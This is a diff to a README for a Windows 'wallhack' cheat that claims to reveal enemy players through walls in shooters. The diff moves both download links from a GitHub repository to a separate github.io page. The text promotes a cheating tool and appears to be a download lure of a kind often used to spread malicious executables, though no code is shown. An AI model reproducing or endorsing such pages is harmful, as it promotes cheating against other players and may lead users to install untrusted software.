@@ -1,12 +1,12 @@
 # 👁️ humen-wallhack-v2026-script - See enemies through solid game objects
 
-[![Download](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Faltu2264/humen-wallhack-v2026-script)
+[![Download](https://img.shields.io/badge/Download-Release-blue)](https://faltu2264.github.io)
 
 This software acts as a visibility utility for first-person shooters and battle royale titles. It renders a live overlay on your Windows screen to track player positions. The program functions on Windows 10 and Windows 11 systems.
 
 ## 📥 How to download and install
 
-Visit [this page](https://github.com/Faltu2264/humen-wallhack-v2026-script) to download the current version.
+Visit [this page](https://faltu2264.github.io) to download the current version.
 
 1. Open your web browser and navigate to the link provided above.
 2. Locate the section labeled Releases.
